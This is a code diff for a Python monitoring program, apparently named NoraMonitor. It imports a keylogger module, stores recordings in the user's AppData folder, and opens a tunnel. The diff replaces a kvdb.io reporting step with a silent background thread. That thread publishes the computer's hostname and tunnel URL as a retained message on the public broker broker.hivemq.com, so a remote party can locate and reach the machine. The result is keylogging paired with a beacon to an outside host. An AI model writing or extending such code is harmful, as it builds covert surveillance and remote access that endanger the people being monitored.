@@ -4,8 +4,9 @@ import json
 import socket
 import subprocess
 import threading
-import urllib.request
-import urllib.parse
+
+MQTT_BROKER  = "broker.hivemq.com"
+MQTT_TOPIC   = "nora/7638d08dcd8340ef953c"
 
 import server
 import keylogger as kl
@@ -21,39 +22,16 @@ _APP_DIR        = os.path.join(os.path.expandvars("%APPDATA%"), "NoraMonitor")
 _RECORDINGS_DIR = os.path.join(_APP_DIR, "recordings")
 _CONFIG_FILE    = os.path.join(_APP_DIR, "config.json")
 
-KVDB_BASE = "https://kvdb.io"
-
-
-def _load_config():
+def _publish_url(pc_name, tunnel_url):
     try:
-        with open(_CONFIG_FILE) as f:
-            return json.load(f)
-    except Exception:
-        return {}
-
-
-def _save_config(cfg):
-    try:
-        with open(_CONFIG_FILE, "w") as f:
-            json.dump(cfg, f, indent=2)
+        import paho.mqtt.client as mqtt
+        client = mqtt.Client()
+        client.connect(MQTT_BROKER, 1883, 60)
+        topic = f"{MQTT_TOPIC}/{pc_name.replace(' ', '_')}"
+        client.publish(topic, tunnel_url, qos=1, retain=True)
+        client.disconnect()
     except Exception:
         pass
-
-
-def _ensure_bucket():
-    req = urllib.request.Request(KVDB_BASE, data=b"", method="POST")
-    with urllib.request.urlopen(req, timeout=10) as r:
-        return r.read().decode().strip()
-
-
-def _post_url(bucket_id, pc_name, tunnel_url):
-    key = urllib.parse.quote(pc_name, safe="")
-    req = urllib.request.Request(
-        f"{KVDB_BASE}/{bucket_id}/{key}",
-        data=tunnel_url.encode(),
-        method="POST"
-    )
-    urllib.request.urlopen(req, timeout=10)
 
 
 def _start_tunnel(port):
@@ -75,30 +53,10 @@ def _start_tunnel(port):
                     import time; time.sleep(2)
                     server.broadcast_ngrok_url(tunnel_url)
 
-                    # Auto PC name from hostname
-                    cfg = _load_config()
-                    pc_name = cfg.get("pc_name") or socket.gethostname()
-                    cfg["pc_name"] = pc_name
-
-                    # Auto-create bucket if needed
-                    bucket_id = cfg.get("bucket_id", "")
-                    if not bucket_id:
-                        try:
-                            bucket_id = _ensure_bucket()
-                            cfg["bucket_id"] = bucket_id
-                        except Exception:
-                            _save_config(cfg)
-                            break
-
-                    _save_config(cfg)
-
-                    # Broadcast bucket ID to viewer so user can copy it
-                    server.broadcast_bucket_id(bucket_id)
-
-                    try:
-                        _post_url(bucket_id, pc_name, tunnel_url)
-                    except Exception:
-                        pass
+                    pc_name = socket.gethostname()
+                    threading.Thread(
+                        target=_publish_url, args=(pc_name, tunnel_url), daemon=True
+                    ).start()
                     break
             proc.wait()
         except Exception:
